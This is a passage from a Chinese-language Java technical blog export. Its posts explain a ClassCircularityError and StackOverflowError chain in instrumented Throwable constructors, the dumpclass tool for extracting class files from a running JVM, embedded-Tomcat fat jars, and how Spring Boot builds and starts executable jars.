class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个ClassNotFoundException的具体信息是<code>sun.reflect.MethodAccessorImpl</code>。实际上是MethodAccessorGenerator在生成反射调用代码里要用到的，所以需要加载到ClassLoader里。因此自定义的URLClassLoader在findClass时抛出了一个ClassNotFoundException。</p>
<h2 id="ClassCircularityError是怎么产生的"><a href="#ClassCircularityError是怎么产生的" class="headerlink" title="ClassCircularityError是怎么产生的"></a>ClassCircularityError是怎么产生的</h2><p>抛出的ClassNotFoundException是Throwable的一个子类，所以也会调用Throwable的构造函数，然后需要调用到<code>Spy.ON_BEFORE_METHOD.invoke</code> 。</p>
<p>注意，这时<code>Spy.ON_BEFORE_METHOD.invoke</code>的反射调用代码已经生成了，但是还没有置入到ClassLoader里，也没有放到DelegatingMethodAccessorImpl里。所以这时仍然调用的是NativeMethodAccessorImpl，然后再次生成反射调用类，name是<code>sun/reflect/GeneratedMethodAccessor2</code>。</p>
<p>生成<code>GeneratedMethodAccessor2</code>之后， 会调用<code>Unsafe.define</code>来define这个class。这里抛出了ClassCircularityError。</p>
<h2 id="为什么会抛出ClassCircularityError"><a href="#为什么会抛出ClassCircularityError" class="headerlink" title="为什么会抛出ClassCircularityError"></a>为什么会抛出ClassCircularityError</h2><p>因为<code>Unsafe.defineClass</code> 是native实现，所以需要查看hotspot源码才能知道具体的细节。</p>
<p>SystemDictionary是jvm里加载的所有类的总管，所以在defineClass，会调用到这个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// systemDictionary.cpp</span></span><br><span class="line"><span class="function">Klass* <span class="title">SystemDictionary::resolve_instance_class_or_null</span><span class="params">(Symbol* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Handle class_loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Handle protection_domain,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        TRAPS)</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>然后，在这里面会有一个判断循环的方法。防止循环依赖。如果是发现了循环，则会抛出ClassCircularityError。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// systemDictionary.cpp</span></span><br><span class="line">          <span class="comment">// only need check_seen_thread once, not on each loop</span></span><br><span class="line">          <span class="comment">// 6341374 java/lang/Instrument with -Xcomp</span></span><br><span class="line">          <span class="keyword">if</span> (oldprobe-&gt;check_seen_thread(THREAD, PlaceholderTable::LOAD_INSTANCE)) &#123;</span><br><span class="line">            throw_circularity_error = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (throw_circularity_error) &#123;</span><br><span class="line">      <span class="function">ResourceMark <span class="title">rm</span><span class="params">(THREAD)</span></span>;</span><br><span class="line">      THROW_MSG_NULL(vmSymbols::java_lang_ClassCircularityError(), child_name-&gt;as_C_string());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这个循环检测是怎么工作的呢？</p>
<p>实际上是把线程放到一个queue里，然后判断这个queue里的保存的前一个线程是不是一样的，如果是一样的，则会认为出现循环了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// placeholders.cpp</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">check_seen_thread</span><span class="params">(Thread* thread, PlaceholderTable::classloadAction action)</span> </span>&#123;</span><br><span class="line">    assert_lock_strong(SystemDictionary_lock);</span><br><span class="line">    SeenThread* threadQ = actionToQueue(action);</span><br><span class="line">    SeenThread* seen = threadQ;</span><br><span class="line">    <span class="keyword">while</span> (seen) &#123;</span><br><span class="line">      <span class="keyword">if</span> (thread == seen-&gt;thread()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      seen = seen-&gt;next();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">SeenThread* <span class="title">actionToQueue</span><span class="params">(PlaceholderTable::classloadAction action)</span> </span>&#123;</span><br><span class="line">    SeenThread* queuehead;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> PlaceholderTable::LOAD_INSTANCE:</span><br><span class="line">         queuehead = _loadInstanceThreadQ;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PlaceholderTable::LOAD_SUPER:</span><br><span class="line">         queuehead = _superThreadQ;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PlaceholderTable::DEFINE_CLASS:</span><br><span class="line">         queuehead = _defineThreadQ;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: Unimplemented();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> queuehead;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>就这个例子实际情况来说，就是同一个thread里，在defineClass时，再次defineClass，这样子就出现了循环。所以抛出了一个ClassCircularityError。</p>
<h2 id="StackOverflowError怎么产生的"><a href="#StackOverflowError怎么产生的" class="headerlink" title="StackOverflowError怎么产生的"></a>StackOverflowError怎么产生的</h2><p>OK，搞明白ClassCircularityError这个异常是怎么产生的之后，回到原来的流程看下。</p>
<p>这个ClassCircularityError也是Throwable的一个子类，那么它也需要初始化，然后调用<code>Spy.ON_BEFORE_METHOD.invoke</code> ……</p>
<p>然后，接下来就生成一个<code>sun/reflect/GeneratedMethodAccessor3</code> ，然后会被defindClass，然后就会检测到循环，然后再次抛出ClassCircularityError。 </p>
<p>就这样子，最终一直到StackOverflowError</p>
<h2 id="完整的异常产生流程"><a href="#完整的异常产生流程" class="headerlink" title="完整的异常产生流程"></a>完整的异常产生流程</h2><ul>
<li>Throwable的构造函数被增强之后，需要调用<code>Spy.ON_BEFORE_METHOD.invoke</code></li>
<li><code>Spy.ON_BEFORE_METHOD.invoke</code>经过16次调用之后，jvm会生成反射调用优化代码</li>
<li>反射调用优化类<code>sun/reflect/GeneratedMethodAccessor1</code>需要被自定义的ClassLoader加载</li>
<li>自定义的ClassLoader重写了loadClass函数，抛出了一个ClassNotFoundException</li>
<li>ClassNotFoundException在构造时，调用了Throwable的构造函数，然后调用了<code>Spy.ON_BEFORE_METHOD.invoke</code></li>
<li><code>Spy.ON_BEFORE_METHOD.invoke</code> 生成反射调用优化代码：<code>sun/reflect/GeneratedMethodAccessor2</code></li>
<li>Unsafe在defineClass <code>sun/reflect/GeneratedMethodAccessor2</code> 时，检测到循环，抛出了ClassCircularityError</li>
<li>ClassCircularityError在构造时，调用了Throwable的构造函数，然后调用了<code>Spy.ON_BEFORE_METHOD.invoke</code></li>
<li><p>反射调用优化类<code>sun/reflect/GeneratedMethodAccessor3</code> 在defineClass时，检测到循环，抛出了ClassCircularityError</p>
</li>
<li><p>…… 不断抛出ClassCircularityError，最终导致StackOverflowError</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个问题的根源是在Throwable的构造函数里抛出了异常，这样子明显无解。</p>
<p>为了避免这个问题，需要保证增强过后的Throwable的构造函数里不能抛出任何异常。然而因为jvm的反射调用优化，导致ClassLoader在loadClass时抛出了异常。所以要避免在加载jvm生成反射优化类时抛出异常。</p>
<p>修改过后的自定义URLClassLoader代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span> + agentJar)&#125;) &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; loadedClass = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (loadedClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> loadedClass;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 优先从parent（SystemClassLoader）里加载系统类，避免抛出ClassNotFoundException</span></span><br><span class="line">        <span class="keyword">if</span>(name != <span class="keyword">null</span> &amp;&amp; (name.startsWith(<span class="string">"sun."</span>) || name.startsWith(<span class="string">"java."</span>))) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> aClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          <span class="comment">// ignore</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>从java进程里dump出类的class文件的小工具--dumpclass</title>
    <url>/dumpclass/</url>
    <content><![CDATA[<h2 id="Serviceability-Agent"><a href="#Serviceability-Agent" class="headerlink" title="Serviceability Agent"></a>Serviceability Agent</h2><p>想要查看一些被增强过的类的字节码，或者一些AOP框架的生成类，就需要dump出运行时的java进程里的字节码。</p>
<p>从运行的java进程里dump出运行中的类的class文件的方法，所知道的有两种</p>
<ul>
<li><p>用agent attatch 到进程，然后利用<code>Instrumentation</code>和<code>ClassFileTransformer</code>就可以获取 到类的字节码了。</p>
</li>
<li><p>使用<code>sd-jdi.jar</code>里的工具</p>
</li>
</ul>
<p><code>sd-jdi.jar</code> 里自带的的<code>sun.jvm.hotspot.tools.jcore.ClassDump</code>就可以把类的class内容dump到文件里。</p>
<p><code>ClassDump</code>里可以设置两个System properties：</p>
<ul>
<li><code>sun.jvm.hotspot.tools.jcore.filter</code>  Filter的类名</li>
<li><code>sun.jvm.hotspot.tools.jcore.outputDir</code> 输出的目录</li>
</ul>
<p><code>sd-jdi.jar</code> 里有一个<code>sun.jvm.hotspot.tools.jcore.PackageNameFilter</code>，可以指定Dump哪些包里的类。<code>PackageNameFilter</code>里有一个System property可以指定过滤哪些包：<code>sun.jvm.hotspot.tools.jcore.PackageNameFilter.pkgList</code>。</p>
<p>所以可以通过这样子的命令来使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo java -classpath &quot;$JAVA_HOME/lib/sa-jdi.jar&quot; -Dsun.jvm.hotspot.tools.jcore.filter=sun.jvm.hotspot.tools.jcore.PackageNameFilter -Dsun.jvm.hotspot.tools.jcore.PackageNameFilter.pkgList=com.test  sun.jvm.hotspot.tools.jcore.ClassDump</span><br></pre></td></tr></table></figure>
<p>显然，这个使用起来太麻烦了，而且不能应对复杂的场景。</p>
<h2 id="dumpclass"><a href="#dumpclass" class="headerlink" title="dumpclass"></a>dumpclass</h2><p>dumpclass这个小工具做了一些增强，更加方便地使用。</p>
<ul>
<li>支持<code>? *</code>的匹配</li>
<li>支持多个ClassLoader加载了同名类的情况。</li>
</ul>
<p>比如多个classloader加载了多份的logger，如果不做区分，则dump出来时会被覆盖掉，也分析不出问题。</p>
<p>dumpclass可以在maven仓库里下载到：<br><a href="http://search.maven.org/#search%7Cga%7C1%7Cdumpclass" target="_blank" rel="noopener">http://search.maven.org/#search%7Cga%7C1%7Cdumpclass</a></p>
<p>dumpclass的用法很简单，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line"> java -jar dumpclass.jar &lt;pid&gt; &lt;pattern&gt; [outputDir] &lt;--classLoaderPrefix&gt;</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"> java -jar dumpclass.jar 4345 *StringUtils</span><br><span class="line"> java -jar dumpclass.jar 4345 *StringUtils /tmp</span><br><span class="line"> java -jar dumpclass.jar 4345 *StringUtils /tmp --classLoaderPrefix</span><br></pre></td></tr></table></figure>
<p>对于多个ClassLoader的情况，可以使用<code>--classLoaderPrefix</code>，这样子在输出<code>.class</code>文件时，会为每一个ClasssLoader创建一个目录，比如：<code>sun.jvm.hotspot.oops.Instance@955d26b8</code>。并且会在目录下放一个<code>classLoader.text</code>文件，里面是<code>ClassLoader.toString()</code>的内容，方便查看具体ClassLoader是什么。</p>
<p>源码和文档：</p>
<p><a href="https://github.com/hengyunabc/dumpclass" target="_blank" rel="noopener">https://github.com/hengyunabc/dumpclass</a> </p>
<h2 id="HSDB"><a href="#HSDB" class="headerlink" title="HSDB"></a>HSDB</h2><p>在<code>sa-jdi.jar</code>里，还有一个图形化的工具HSDB，也可以用来查看运行的的字节码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo java -classpath <span class="string">"<span class="variable">$JAVA_HOME</span>/lib/sa-jdi.jar"</span> sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rednaxelafx.iteye.com/blog/727938" target="_blank" rel="noopener">http://rednaxelafx.iteye.com/blog/727938</a><br><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/instrument/ClassFileTransformer.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/api/java/lang/instrument/ClassFileTransformer.html</a><br><a href="http://openjdk.java.net/groups/hotspot/docs/Serviceability.html" target="_blank" rel="noopener">http://openjdk.java.net/groups/hotspot/docs/Serviceability.html</a> </p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>应用内置embeded tomcat，并打包为fat jar的解决方案</title>
    <url>/embeded-tomcat-fat-jar/</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>大量的微服务框架引起了一大波embeded tomcat，executable fat jar的潮流。显然spring boot是最出色的解决方案，但是spring boot有两个不足的地方：</p>
<ul>
<li>不支持配置web.xml文件，对于旧应用迁移不方便</li>
<li>一些配置在web.xml里配置起来很直观，放到代码里配置就难搞清楚顺序了。比如一些filter的顺序关系。</li>
<li>spring boot的方案依赖spring，对于一些轻量级的应用不想引入依赖</li>
</ul>
<p>基于这些考虑，这里提出一个基于embeded tomcat本身的解决方案。</p>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h2><p><a href="https://github.com/hengyunabc/executable-embeded-tomcat-sample" target="_blank" rel="noopener">https://github.com/hengyunabc/executable-embeded-tomcat-sample</a></p>
<p>支持特性：</p>
<ul>
<li>支持加载传统的web.xml配置</li>
<li>支持打包为fat jar方式运行</li>
<li>支持在IDE里直接运行</li>
</ul>
<h2 id="旧应用迁移步聚"><a href="#旧应用迁移步聚" class="headerlink" title="旧应用迁移步聚"></a>旧应用迁移步聚</h2><p>旧应用迁移非常的简单</p>
<ul>
<li>在pom.xml里增加embeded tomcat的依赖</li>
<li>把应用原来的<code>src/main/webapp/WEB-INF</code> 移动到 <code>src/main/resources/WEB-INF</code>下，把在<code>src/main/webapp</code>下面的所有文件移动到 <code>src/main/META-INF/resources</code>目录下</li>
<li>写一个main函数，把tomcat启动起来</li>
</ul>
<p>非常的简单，完全支持旧应用的所有功能，不用做任何的代码改造。</p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><h3 id="web-xml的读取"><a href="#web-xml的读取" class="headerlink" title="web.xml的读取"></a>web.xml的读取</h3><p>传统的Tomcat有两个目录，一个是baseDir，对应tomcat本身的目录，下面有conf, bin这些文件夹。一个是webapp的docBase目录，比如webapps/ROOT 这个目录。</p>
<p>docBase只能是一个目录，或者是一个<code>.war</code>结尾的文件（实际对应不解压war包运行的方式）。</p>
<p>tomcat里的一个webapp对应有一个Context，Context里有一个<code>WebResourceRoot</code>，应用里的资源都是从<code>WebResourceRoot</code> 里加载的。tomcat在初始化Context时，会把docBase目录加到<code>WebResourceRoot</code>里。</p>
<p>tomcat在加载应用的web.xml里，是通过<code>ServletContext</code>来加载的，而<code>ServletContext</code>实际上是通过<code>WebResourceRoot</code>来获取到资源的。</p>
<p>所以简而言之，需要在tomcat启动之前，web.xml放到Context的<code>WebResourceRoot</code>，这样子tomcat就可以读取到web.xml里。</p>
<h3 id="静态资源的处理"><a href="#静态资源的处理" class="headerlink" title="静态资源的处理"></a>静态资源的处理</h3><p>在Servlet 3.0规范里，应用可以把静态的资源放在jar包里的<code>/META-INF/classes</code>目录，或者在<code>WEB-INF/classes/META-INF/resources</code>目录下。</p>
<p>所以，采取了把资源文件全都放到<code>src/main/META-INF/resources</code>目录的做法，这样子有天然符合Servlet的规范，而且在打包时，自然地打包到fat jar里。</p>
<h3 id="Fat-jar的支持"><a href="#Fat-jar的支持" class="headerlink" title="Fat jar的支持"></a>Fat jar的支持</h3><p>Fat jar的支持是通过<code>spring-boot-maven-plugin</code>来实现的，它提供了把应用打包为fat jar，并启动的能力。具体原理可以参考另外一篇博客：<a href="http://blog.csdn.net/hengyunabc/article/details/50120001" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/50120001</a></p>
<p>当然，也可以用其它的方式把依赖都打包到一起，比如<code>maven-assembly-plugin/jar-with-dependencies</code> ，但不推荐，毕竟spring boot的方案很优雅。</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p><a href="http://home.apache.org/~markt/presentations/2010-11-04-Embedding-Tomcat.pdf" target="_blank" rel="noopener">http://home.apache.org/~markt/presentations/2010-11-04-Embedding-Tomcat.pdf</a>   </p>
<p>官方的Embedded Tomcat文档</p>
<p><a href="http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/basic_app_embedded_tomcat/basic_app-tomcat-embedded.html" target="_blank" rel="noopener">http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/basic_app_embedded_tomcat/basic_app-tomcat-embedded.html</a></p>
<p>oracle的技术文档里的一个方案，但是这个方案太简单了，不支持在IDE里启动，不支持加载web.xml文件。</p>
<p><a href="https://github.com/kui/executable-war-sample" target="_blank" rel="noopener">https://github.com/kui/executable-war-sample</a></p>
<p>这个把依赖都打包进war包里，然后在初始化tomcat里，直接把这个war做为docBase。这样子可以加载到web.xml。但是有一个严重的安全问题，因为应用的<code>.class</code>文件直接在war的根目录下，而不是在<code>/WEB-INF/classes</code>目录下，所以可以直接通过http访问到应用的<code>.class</code>文件，即攻击者可以直接拿到应用的代码来逆向分析。这个方案并不推荐使用。</p>
<p>实际上spring boot应用以一个war包直接运行时，也是有这个安全问题的。只是spring boot泄露的只是spring boot loader的<code>.class</code>文件。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>tomcat</tag>
        <tag>fatjar</tag>
      </tags>
  </entry>
  <entry>
    <title>spring boot executable jar/war 原理</title>
    <url>/spring-boot-executable-jar/</url>
    <content><![CDATA[<h2 id="spring-boot-executable-jar-war"><a href="#spring-boot-executable-jar-war" class="headerlink" title="spring boot executable jar/war"></a>spring boot executable jar/war</h2><p>spring boot里其实不仅可以直接以 <code>java -jar demo.jar</code>的方式启动，还可以把jar/war变为一个可以执行的脚本来启动，比如<code>./demo.jar</code>。</p>
<p>把这个executable jar/war 链接到<code>/etc/init.d</code>下面，还可以变为linux下的一个service。</p>
<p>只要在<code>spring boot maven plugin</code>里配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executable</span>&gt;</span>true<span class="tag">&lt;/<span class="name">executable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子打包出来的jar/war就是可执行的。更多详细的内容可以参考官方的文档。</p>
<p><a href="http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#deployment-install" target="_blank" rel="noopener">http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#deployment-install</a></p>
<h2 id="zip格式里的magic-number"><a href="#zip格式里的magic-number" class="headerlink" title="zip格式里的magic number"></a>zip格式里的magic number</h2><p>生成的jar/war实际上是一个zip格式的文件，这个zip格式文件为什么可以在shell下面直接执行？</p>
<p>研究了下zip文件的格式。zip文件是由entry组成的，而每一个entry开头都有一个4个字节的magic number：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Local file header signature = 0x04034b50 (read as a little-endian number)</span><br><span class="line"></span><br><span class="line">即 PK\003\004</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://en.wikipedia.org/wiki/Zip_(file_format)" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Zip_(file_format)</a></p>
<p><strong>zip处理软件是读取到magic number才开始处理。所以在linux/unix下面，可以把一个bash文件直接写在一个zip文件的开头，这样子会被认为是一个bash script。 而zip处理软件在读取这个文件时，仍然可以正确地处理。</strong></p>
<p>比如spring boot生成的executable jar/war，的开头是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    .   ____          _            __ _ _</span></span><br><span class="line"><span class="comment">#   /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \</span></span><br><span class="line"><span class="comment">#  ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \</span></span><br><span class="line"><span class="comment">#   \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span></span><br><span class="line"><span class="comment">#    '  |____| .__|_| |_|_| |_\__, | / / / /</span></span><br><span class="line"><span class="comment">#   =========|_|==============|___/=/_/_/_/</span></span><br><span class="line"><span class="comment">#   :: Spring Boot Startup Script ::</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>在script内容结尾，可以看到zip entry的magic number:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit 0</span><br><span class="line">PK^C^D</span><br></pre></td></tr></table></figure>
<h2 id="spring-boot的launch-script"><a href="#spring-boot的launch-script" class="headerlink" title="spring boot的launch.script"></a>spring boot的launch.script</h2><p>实际上spring boot maven plugin是把下面这个script打包到fat jar的最前面部分。</p>
<p><a href="https://github.com/spring-projects/spring-boot/blob/v1.5.18.RELEASE/spring-boot-tools/spring-boot-loader-tools/src/main/resources/org/springframework/boot/loader/tools/launch.script" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/blob/v1.5.18.RELEASE/spring-boot-tools/spring-boot-loader-tools/src/main/resources/org/springframework/boot/loader/tools/launch.script</a> </p>
<p>这个launch.script 支持很多变量设置。还可以自动识别是处于<code>auto</code>还是<code>service</code>不同mode中。</p>
<p>所谓的<code>auto mode</code>就是指直接运行jar/war：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./demo.jar</span><br></pre></td></tr></table></figure>
<p>而<code>service mode</code>则是由操作系统在启动service的情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service demo start/stop/restart/status</span><br></pre></td></tr></table></figure>
<p>所以fat jar可以直接在普通的命令行里执行，<code>./xxx.jar</code> 或者link到<code>/etc/init.d/</code>下，变为一个service。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>jar/war实际就是zip格式</li>
<li>spring-boot-maven-plugin把启动脚本打到executable jar/war的最前面</li>
<li>脚本的最后一行是<code>exit 0</code>，脚本只执行自己的内容，不会执行到jar/war里的内容</li>
<li>zip文件由多个entry组成，entry的开头有magic number，所以zip处理软件可以跳过前面的脚本，准确找到zip entry</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>spring boot应用启动原理分析</title>
    <url>/spring-boot-application-start-analysis/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文分析的是spring boot 1.3.<em> 的工作原理。spring boot 1.4.</em> 之后打包结构发现了变化，增加了<code>BOOT-INF</code>目录，但是基本原理还是不变的。</p>
<p>关于spring boot 1.4.* 里ClassLoader的变化，可以参考：<a href="http://hengyunabc.github.io/spring-boot-classloader/">http://hengyunabc.github.io/spring-boot-classloader/</a></p>
<h2 id="spring-boot-quick-start"><a href="#spring-boot-quick-start" class="headerlink" title="spring boot quick start"></a>spring boot quick start</h2><p>在spring boot里，很吸引人的一个特性是可以直接把应用打包成为一个jar/war，然后这个jar/war是可以直接启动的，不需要另外配置一个Web Server。</p>
<p>如果之前没有使用过spring boot可以通过下面的demo来感受下。<br>下面以这个工程为例，演示如何启动Spring boot项目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:hengyunabc/spring-boot-demo.git</span><br><span class="line">mvn spring-boot-demo</span><br><span class="line">java -jar target/demo-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p>如果使用的IDE是spring sts或者idea，可以通过向导来创建spring boot项目。</p>
<p>也可以参考官方教程：<br><a href="http://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/#getting-started-first-application" target="_blank" rel="noopener">http://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/#getting-started-first-application</a></p>
<h2 id="对spring-boot的两个疑问"><a href="#对spring-boot的两个疑问" class="headerlink" title="对spring boot的两个疑问"></a>对spring boot的两个疑问</h2><p>刚开始接触spring boot时，通常会有这些疑问</p>
<ul>
<li>spring boot如何启动的？</li>
<li>spring boot embed tomcat是如何工作的？ 静态文件，jsp，网页模板这些是如何加载到的？</li>
</ul>
<p>下面来分析spring boot是如何做到的。</p>
<h2 id="打包为单个jar时，spring-boot的启动方式"><a href="#打包为单个jar时，spring-boot的启动方式" class="headerlink" title="打包为单个jar时，spring boot的启动方式"></a>打包为单个jar时，spring boot的启动方式</h2><p>maven打包之后，会生成两个jar文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">demo-0.0.1-SNAPSHOT.jar</span><br><span class="line">demo-0.0.1-SNAPSHOT.jar.original</span><br></pre></td></tr></table></figure>
<p>其中demo-0.0.1-SNAPSHOT.jar.original是默认的maven-jar-plugin生成的包。</p>
<p>demo-0.0.1-SNAPSHOT.jar是spring boot maven插件生成的jar包，里面包含了应用的依赖，以及spring boot相关的类。下面称之为fat jar。</p>
<p>先来查看spring boot打好的包的目录结构（不重要的省略掉）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── META-INF</span><br><span class="line">│   ├── MANIFEST.MF</span><br><span class="line">├── application.properties</span><br><span class="line">├── com</span><br><span class="line">│   └── example</span><br><span class="line">│       └── SpringBootDemoApplication.class</span><br><span class="line">├── lib</span><br><span class="line">│   ├── aopalliance-1.0.jar</span><br><span class="line">│   ├── spring-beans-4.2.3.RELEASE.jar</span><br><span class="line">│   ├── ...</span><br><span class="line">└── org</span><br><span class="line">    └── springframework</span><br><span class="line">        └── boot</span><br><span class="line">            └── loader</span><br><span class="line">                ├── ExecutableArchiveLauncher.class</span><br><span class="line">                ├── JarLauncher.class</span><br><span class="line">                ├── JavaAgentDetector.class</span><br><span class="line">                ├── LaunchedURLClassLoader.class</span><br><span class="line">                ├── Launcher.class</span><br><span class="line">                ├── MainMethodRunner.class</span><br><span class="line">                ├── ...</span><br></pre></td></tr></table></figure>
<p>依次来看下这些内容。</p>
<h3 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Start-Class: com.example.SpringBootDemoApplication</span><br><span class="line">Implementation-Vendor-Id: com.example</span><br><span class="line">Spring-Boot-Version: 1.3.0.RELEASE</span><br><span class="line">Created-By: Apache Maven 3.3.3</span><br><span class="line">Build-Jdk: 1.8.0_60</span><br><span class="line">Implementation-Vendor: Pivotal Software, Inc.</span><br><span class="line">Main-Class: org.springframework.boot.loader.JarLauncher</span><br></pre></td></tr></table></figure>
<p>可以看到有Main-Class是org.springframework.boot.loader.JarLauncher ，这个是jar启动的Main函数。</p>
<p>还有一个Start-Class是com.example.SpringBootDemoApplication，这个是我们应用自己的Main函数。</p>
